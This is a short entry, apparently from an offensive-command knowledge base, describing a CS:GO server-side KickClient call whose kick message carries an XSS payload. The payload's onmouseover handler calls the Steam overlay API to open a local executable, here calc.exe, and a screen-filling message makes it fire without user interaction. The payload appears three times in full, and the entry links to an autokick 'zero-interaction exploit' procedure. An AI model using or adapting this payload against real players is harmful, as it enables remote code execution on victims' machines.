---
data: >-
  KickClient(client, "<a
  onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour
  account has been banned from this community.\n\nThe ban is non
  negotiable</a>")
tags:
  - csgo
  - rce
  - autokick
type: command
executor: bash
platforms:
  - Windows
  - 'CS:GO'
id: 50a86619-0c88-4cf4-9bb3-8a373009bd4f
created_at: '2025-12-14T00:11:25.206Z'
updated_at: '2025-12-14T00:11:25.206Z'
verified: false
validated: true
submitted: true
---
# Kickclient with Autokick Payload

## Command

```bash
KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>")
```

## Description

Kicks the client with a screen-filling XSS payload to auto-trigger on spawn.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `client` | Target client ID | Yes |
| `message` | Contains <a> tag with onmouseover event | Yes |

## Examples

### Basic Usage

```bash
KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>")
```

## Expected Output

Opens calc.exe without user interaction due to mouse position.

## Related

- [[procedures/Create-Autokick-Plugin-for-Zero-Interaction-Exploit]]
